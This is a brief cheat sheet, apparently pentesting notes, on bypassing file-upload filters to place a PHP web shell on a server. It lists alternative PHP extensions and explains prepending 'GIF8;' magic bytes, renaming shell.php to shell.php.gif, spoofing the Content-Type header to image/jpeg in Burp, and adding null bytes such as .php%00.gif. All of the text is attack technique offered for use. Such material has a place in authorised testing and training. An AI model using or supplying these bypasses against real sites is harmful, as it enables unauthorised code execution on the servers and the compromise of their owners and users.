php extensions to try on restricted upload pages:
.php
.php5
.phtml
.png.php
.jpeg.php
.pht
.phpt
.php3
.php4
.php6

GIF bypass
if .gif extension are allowed on a file upload system add:

GIF8;
 
to the top of a php file above <?php

run the command: file shell.php and verify it shows GIF
now change the file name using: mv shell.php shell.php.gif

when doing a .jpeg.php upload bypass make sure to capture the request in burp
after doing so make sure that content type is changed to image/jpeg instead of application/php

if none of the following is working try adding null bytes to the extensions: Example below

.php%00.gif, .php%00.jpg, .php%00.png, etc
